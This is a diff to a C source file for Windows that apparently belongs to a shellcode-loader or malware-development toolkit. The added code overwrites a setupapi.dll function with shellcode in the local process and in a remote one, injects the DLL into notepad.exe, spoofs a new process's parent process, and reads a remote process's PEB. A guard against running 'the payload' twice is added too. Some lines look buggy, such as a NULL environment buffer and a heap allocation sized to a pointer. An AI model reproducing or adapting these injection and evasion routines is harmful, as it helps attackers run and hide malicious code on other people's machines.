@@ -8,36 +8,24 @@
 
 #pragma comment (lib, "OneCore.lib") // Required for MapViewOfFile2
 
-BOOL ReportErrorWinAPI(char* ApiName)
+
+BOOL ObtainWinAPIAddress(IN LPCSTR lpDllName, IN LPCSTR lpFunctionName, OUT PVOID* pAddress)
 {
-	printf("[!] \"%s\" WinAPI Failed with Error : %d\n", ApiName, GetLastError());
+	HMODULE hMod;
 
-	return FALSE;
-}
+	// check if the DLL is already loaded in the process' address space
+	if ((hMod = GetModuleHandle(lpDllName)) == NULL)
+		if ((hMod = LoadLibraryA(lpDllName)) == NULL) // load it if it isn't
+		{
+			printf("[!] Could not load %s DLL!\n", lpDllName);
+			return ReportErrorWinAPI("LoadLibraryA");
+		}
 
-BOOL ReportErrorNTAPI(char* ApiName, NTSTATUS STATUS)
-{
-	printf("[!] \"%s\" NTAPI Failed with Error : 0x%0.8X\n", ApiName, STATUS);
-
-	return FALSE;
-}
-
-BOOL ConvertToLowerCase(IN LPCWSTR lpszInput, OUT LPWSTR* pOutput)
-{
-	WCHAR LowerName[MAX_PATH * 2];
-	SIZE_T Size;
-	int i;
-
-	Size = lstrlenW(lpszInput);
-	RtlSecureZeroMemory(LowerName, Size);
-	if (Size < MAX_PATH * 2)
+	if ((*pAddress = GetProcAddress(hMod, lpFunctionName)) == NULL)
 	{
-		for (i = 0; i < Size; i++)
-			LowerName[i] = (WCHAR) tolower(lpszInput[i]);
-		LowerName[i++] = '\0';
+		printf("[!] Could not obtain the address of %s function inside %s DLL!\n", lpFunctionName, lpDllName);
+		return ReportErrorWinAPI("GetProcAddress");
 	}
-
-	*pOutput = LowerName;
 
 	return TRUE;
 }
@@ -122,11 +110,77 @@ BOOL AllocateMemory(IN DWORD dwType, IN HANDLE hProcess, IN PVOID pShellcode, IN
 		CloseHandle(hFile);
 	}
 
+	else if (dwType == STOMPING)
+	{
+		PVOID pAddress;
+		DWORD oldProtect;
+
+		if (!ObtainWinAPIAddress("setupapi.dll", "SetupScanFileQueueA", &pAddress))
+			return FALSE;
+
+		// Local function stomping
+		if (hProcess == NULL)
+		{
+			if (!VirtualProtect(pAddress, sShellcodeSize, PAGE_READWRITE, &oldProtect))
+				return ReportErrorWinAPI("VirtualProtect");
+
+			memcpy(pAddress, pShellcode, sShellcodeSize);
+
+			if (!VirtualProtect(pAddress, sShellcodeSize, PAGE_EXECUTE_READ, &oldProtect))
+				return ReportErrorWinAPI("VirtualProtect");
+		}
+
+		// Remote function stomping
+		else
+		{
+			SIZE_T bytesWritten;
+
+			// The target DLL must be loaded in order for the target function to exist in the process' address space
+			char DLL[] = "C:\\Windows\\System32\\setupapi.dll";
+			if (!RemoteProcessDllInjection(NULL, "notepad.exe", NULL, DLL))
+				return FALSE;
+
+			if (!VirtualProtectEx(hProcess, pAddress, sShellcodeSize, PAGE_READWRITE, &oldProtect))
+				return ReportErrorWinAPI("VirtualProtectEx1");
+
+			if (!WriteProcessMemory(hProcess, pAddress, pShellcode, sShellcodeSize, &bytesWritten))
+				return ReportErrorWinAPI("WriteProcessMemory");
+
+			if (!VirtualProtectEx(hProcess, pAddress, sShellcodeSize, PAGE_EXECUTE_READ, &oldProtect))
+				return ReportErrorWinAPI("VirtualProtectEx2");
+		}
+
+		memset(pShellcode, '\0', sShellcodeSize);
+		*pShellcodeAddr = pAddress;
+
+		printf("[i] Function stomped SetupScanFileQueueA with shellcode at 0x%p\n", *pShellcodeAddr);
+	}
+
 	return TRUE;
+}
+
+BOOL IsAlreadyRunning()
+{
+	HANDLE hSemaphore;
+
+	if ((hSemaphore = CreateSemaphoreA(NULL, 10, 10, "ControlString")) == NULL)
+		return ReportErrorWinAPI("CreateSemaphoreA");
+
+	if (GetLastError() == ERROR_ALREADY_EXISTS)
+		return TRUE;
+	else
+		return FALSE;
 }
 
 BOOL RunThread(IN HANDLE hProcess, IN BOOL bSuspended, IN PVOID pShellcode, OUT HANDLE* hThread, OUT DWORD* dwThreadId)
 {
+	// Avoid running the payload more than once
+	if (IsAlreadyRunning())
+	{
+		printf("[!] The payload is already running! Exiting...\n");
+		return FALSE;
+	}
+
 	// Local thread
 	if (hProcess == NULL)
 	{
@@ -490,23 +544,27 @@ BOOL CreateAlertableThread(IN HANDLE hProcess, IN DWORD dwAlertableFunction, OUT
 	return TRUE;
 }
 
-BOOL RunProcess(IN DWORD dwCreationFlag, IN LPCSTR lpProcessName, OUT HANDLE* hProcess, OUT HANDLE* hThread, OUT DWORD* dwProcessId)
+BOOL CreateNewProcess(IN DWORD dwCreationFlag, IN LPCSTR lpProcessName, OUT HANDLE* hProcess, OUT HANDLE* hThread, OUT DWORD* dwProcessId)
 {
 	PROCESS_INFORMATION Pi = { 0 };
 	STARTUPINFO Si = { 0 };
-	char ProcessPath[MAX_PATH * 4];
-	char winDir[MAX_PATH * 2];
+	LPSTR lpEnv = NULL;
+	CHAR AbsoluteProcessName[MAX_PATH * 4];
 
 	Si.cb = sizeof(STARTUPINFO);
 
-	if (!GetEnvironmentVariableA("WINDIR", winDir, MAX_PATH * 2))
-		return ReportErrorWinAPI("GetEnvironmentVariableA");
-	sprintf_s(ProcessPath, MAX_PATH * 4, "%s\\System32\\%s", winDir, lpProcessName);
+	// Prepend C:\Windows\System32 to the relative process name
+	if (PathIsRelativeA(lpProcessName))
+	{
+		ExpandEnvironmentStringsA("%windir%", lpEnv, MAX_PATH);
+		snprintf(AbsoluteProcessName, MAX_PATH * 4, "%s\\System32\\%s", lpEnv, lpProcessName);
+		lpProcessName = AbsoluteProcessName;
+	}
 
-	printf("[i] Creating process %s\n", ProcessPath);
+	printf("[i] Creating process %s\n", lpProcessName);
 	if (!CreateProcessA(
 		NULL,
-		ProcessPath,
+		lpProcessName,
 		NULL,
 		NULL,
 		FALSE,
@@ -521,6 +579,98 @@ BOOL RunProcess(IN DWORD dwCreationFlag, IN LPCSTR lpProcessName, OUT HANDLE* hP
 	*hProcess = Pi.hProcess;
 	*hThread = Pi.hThread;
 	*dwProcessId = Pi.dwProcessId;
+
+	return TRUE;
+}
+
+BOOL CreatePPIDSpoofedProcess(IN DWORD dwCreationFlags, IN LPCSTR lpProcessName, IN LPCSTR lpParentProcessName, OUT HANDLE* hProcess, OUT HANDLE* hThread)
+{
+	HANDLE hParentProcess;
+	DWORD dwParentProcessId;
+	PROCESS_INFORMATION Pi = { 0 };
+	STARTUPINFOEXA SiEx = { 0 };
+	SIZE_T sThreadAttList;
+	PPROC_THREAD_ATTRIBUTE_LIST pThreadAttList;
+	CHAR lpEnv[MAX_PATH], System32[MAX_PATH*2], AbsoluteProcessName[MAX_PATH * 4];
+
+	SiEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);
+
+	// Prepend C:\Windows\System32 to the relative process name
+	if (PathIsRelativeA(lpProcessName))
+	{
+		ExpandEnvironmentStringsA("%windir%", lpEnv, MAX_PATH);
+		snprintf(System32, MAX_PATH * 2, "%s\\System32", lpEnv);
+		snprintf(AbsoluteProcessName, MAX_PATH * 4, "%s\\%s", System32, lpProcessName);
+		lpProcessName = AbsoluteProcessName;
+	}
+	// Otherwise just get the path before the process name
+	else
+	{
+		char* tmp = strrchr(lpProcessName, '\\');
+		if (tmp)
+		{
+			int index = tmp - lpProcessName;
+			for (int i = 0; i < index; i++)
+				System32[i] = *(lpProcessName + i);
+			System32[index] = '\0';
+		}
+	}
+
+	if (!ObtainProcessHandle(ENUMPROCESSES, lpParentProcessName, &hParentProcess, &dwParentProcessId))
+		return FALSE;
+
+	InitializeProcThreadAttributeList(NULL, 1, NULL, &sThreadAttList);
+
+	pThreadAttList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sThreadAttList);
+
+	if (!InitializeProcThreadAttributeList(pThreadAttList, 1, NULL, &sThreadAttList))
+		return ReportErrorWinAPI("InitializeProcThreadAttributeList");
+
+	if (!UpdateProcThreadAttribute(pThreadAttList, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL))
+		return ReportErrorWinAPI("UpdateProcThreadAttribute");
+
+	SiEx.lpAttributeList = pThreadAttList;
+
+	if (!CreateProcessA(
+		NULL,
+		lpProcessName,
+		NULL,
+		NULL,
+		FALSE,
+		EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW | dwCreationFlags,
+		NULL,
+		System32,
+		&SiEx.StartupInfo,
+		&Pi
+	))
+		return ReportErrorWinAPI("CreateProcessA");
+	printf("[i] Created process '%s' with PID %d with spoofed parent process %s\n", lpProcessName, Pi.dwProcessId, lpParentProcessName);
+
+	DeleteProcThreadAttributeList(pThreadAttList);
+	CloseHandle(hParentProcess);
+
+	*hProcess = Pi.hProcess;
+	*hThread = Pi.hThread;
+
+	return TRUE;
+}
+
+BOOL RetrievePEB(IN HANDLE hProcess, OUT PVOID* pPebAddress, OUT PPEB* pPeb)
+{
+	PROCESS_BASIC_INFORMATION PBI = { 0 };
+	SIZE_T sPBILen, sPEBLen;
+	NTSTATUS STATUS;
+	fnNtQueryInformationProcess pNtQueryInformationProcess = (fnNtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
+
+	if ((STATUS = pNtQueryInformationProcess(hProcess, ProcessBasicInformation, &PBI, sizeof(PROCESS_BASIC_INFORMATION), &sPBILen)) != 0)
+		return ReportErrorNTAPI("NtQueryInformationProcess", STATUS);
+
+	*pPeb = (PPEB)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PPEB));
+	if (!ReadProcessMemory(hProcess, PBI.PebBaseAddress, *pPeb, sizeof(PEB), &sPEBLen))
+		return ReportErrorWinAPI("ReadProcessMemory");
+
+	*pPebAddress = PBI.PebBaseAddress;
+	printf("[i] Retrieved PEB at 0x%p\n", *pPebAddress);
 
 	return TRUE;
 }
